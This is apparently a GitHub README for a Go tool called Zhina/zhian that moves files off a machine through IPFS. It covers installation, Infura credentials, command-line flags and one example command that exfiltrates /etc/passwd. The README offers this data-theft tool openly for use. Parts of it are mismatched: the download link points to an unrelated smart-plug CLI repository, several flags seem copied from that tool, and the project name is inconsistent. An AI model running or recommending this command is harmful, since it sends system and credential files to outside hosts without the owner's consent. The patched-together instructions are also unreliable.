### Zhina



A simple app to exfiltration data with ipfs and some features.



## Background

![zhina](zhina.png)



## Installation

You can install a few ways:

1. Download the binary for your OS from https://github.com/smford/tplink-hs1x-cli/releases
1. or use `go install`
   ```
   go install -v github.com/hadesscs/zhian
   ```
1. or clone the git repo and build
   ```
   git clone https://github.com/hadesscs/zhian.git
   cd zhian
   go get -v
   go build
   ```


## Configuration

Create a configuration file called `config.yaml` an example is available below:
```
---
infura:
  PROJECT_ID: [PROJECT_ID]
  API_SECRET_KEY: [API_SECRET_KEY]
```


When zhian runs it checks the current directory for a `config.yaml`, if you wish to use a different configuration file use the command `--config /path/to/file.yaml`


## Command Line Options
```
--all             For all devices
--config string   Configuration file: /path/to/file.yaml, default = ./config.yaml (default "config.yaml")
--debug           Display debugging information
--device string   What device to query, (default: "all")
--displayconfig   Display configuration
--do string       encode64, encodedForTest
--help            Display help
--path string     Path to Exfiltrate
--version         Display version information
```




##  Example Usage
| Command | Details |
|:--|:--|
| `zhian --do encode64,encodedForTest --path /etc/passwd` | Exfiltrate password file |



